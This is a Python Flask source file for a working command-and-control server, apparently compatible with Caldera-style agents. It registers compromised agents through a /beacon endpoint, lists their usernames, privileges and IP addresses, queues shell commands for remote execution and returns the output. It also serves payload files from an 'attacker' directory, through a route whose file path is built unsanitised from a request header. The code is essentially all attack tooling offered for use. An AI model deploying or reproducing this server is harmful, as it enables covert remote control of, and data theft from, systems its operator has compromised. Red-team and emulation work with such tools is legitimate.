from flask import Flask, request, jsonify, Response

# from aiohttp import web
import json
import base64
import binascii
from Instruction import Instruction
import uuid
import asyncio

app = Flask(__name__)

# Store agents
agents = {}

commandEvents = {}


def decode_base64(data):
    return base64.b64decode(data).decode("utf-8")


def encode_base64(data):
    return str(base64.b64encode(json.dumps(data).encode()), "utf-8")


# Agent check-in
@app.route("/beacon", methods=["POST"])
def beacon():
    data = request.data
    decoded_data = decode_base64(data)
    json_data = json.loads(decoded_data)

    paw = json_data.get("paw")
    results = json_data.get("results", [])

    if not paw:
        return jsonify({"error": "Missing agent ID"}), 400

    agent = agents.get(paw)

    if not agent:
        agent = {"paw": paw, "info": data, "instructions": []}
        agents[paw] = agent

    for result in results:
        commandId = result.get("id")
        if commandId in commandEvents:
            commandEvents[commandId].set()

    agent["results"] = results

    commands = agent["instructions"]

    instruction_str = json.dumps([json.dumps(i.display) for i in commands])

    response = {
        "paw": paw,
        "sleep": 10,
        "watchdog": int(60),
        "instructions": instruction_str,
    }

    encoded_response = encode_base64(response)

    print("[+] Agent check-in:", paw)

    return encoded_response


# Get agents
@app.route("/agents", methods=["GET"])
def get_agents():
    agents_list = {}
    for paw, data in agents.items():
        try:
            decoded_info = decode_base64(data["info"])
            parsed_info = json.loads(decoded_info)

            agents_list[paw] = {
                "paw": paw,
                "username": parsed_info.get("username"),
                "privilege": parsed_info.get("privilege"),
                "pid": parsed_info.get("pid"),
                "host_ip_addrs": parsed_info.get("host_ip_addrs"),
            }
        except (binascii.Error, UnicodeDecodeError) as exc:
            raise ValueError(f"Invalid base64 data: {exc!r}")
        except json.JSONDecodeError as exc:
            raise ValueError(f"Malformed JSON: {exc!r}")

    return jsonify(agents_list)


# Send command to a specific agent
@app.route("/send_command", methods=["POST"])
async def send_command():
    try:
        data = request.data
        json_data = json.loads(data)
        agent = json_data.get("agent")
        command = json_data.get("command")

        if not agent or not command:
            return jsonify({"error": "Missing agent or command"}), 400

        if agent not in agents:
            return jsonify({"error": "Agent not found"}), 404

        commandId = str(uuid.uuid4())
        instruction = Instruction(
            id=commandId,
            command=encode_base64(command),
            executor="sh",
            timeout=60,
            payloads=[],
            uploads=[],
            delete_payload=False,
        )

        agents[agent]["instructions"].append(instruction)
        commandEvents[commandId] = asyncio.Event()

        try:
            await asyncio.wait_for(commandEvents[commandId].wait(), timeout=30)
        except asyncio.TimeoutError:
            return (
                jsonify(
                    {
                        "results": {
                            "message": "Timeout waiting for response",
                            "id": commandId,
                            "status": "timeout",
                        }
                    }
                ),
                408,
            )

        results = agents[agent]["results"]
        for result in results:
            if result["id"] == commandId:
                response_data = {
                    "id": result.get("id"),
                    "agent_reported_time": result.get("agent_reported_time"),
                    "exit_code": result.get("exit_code"),
                    "pid": result.get("pid"),
                    "status": result.get("status"),
                    "output": decode_base64(result.get("output", "")),
                    "stderr": decode_base64(result.get("stderr", "")),
                }

                # Cleanup
                agents[agent]["results"].remove(result)
                agents[agent]["instructions"].remove(instruction)
                del commandEvents[commandId]

                return jsonify(
                    {"results": {"message": "Command executed", **response_data}}
                )

        return jsonify(
            {
                "results": {
                    "message": "Command sent, no response received",
                    "id": commandId,
                    "status": "pending",
                }
            }
        )

    except json.JSONDecodeError:
        return jsonify({"error": "Invalid JSON data"}), 400
    except Exception as e:
        return jsonify({"error": f"Internal server error: {str(e)}"}), 500


# Download file
@app.route("/file/download", methods=["POST"])
def download():
    try:
        file_name = request.headers.get("File")

        if not file_name:
            return jsonify({"error": "Missing file name"}), 400

        file_path = f"/attacker/c2_server/payloads/{file_name}"
        with open(file_path, "rb") as f:
            file_data = f.read()

        headers = {
            "Content-Disposition": f'attachment; filename="{file_name}"',
            "FILENAME": file_name,
        }

        return file_data, 200, headers

    except FileNotFoundError:
        return jsonify({"error": "File not found"}), 404
    except Exception as e:
        return jsonify({"error": f"Internal server error: {str(e)}"}), 500


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8888, debug=True)
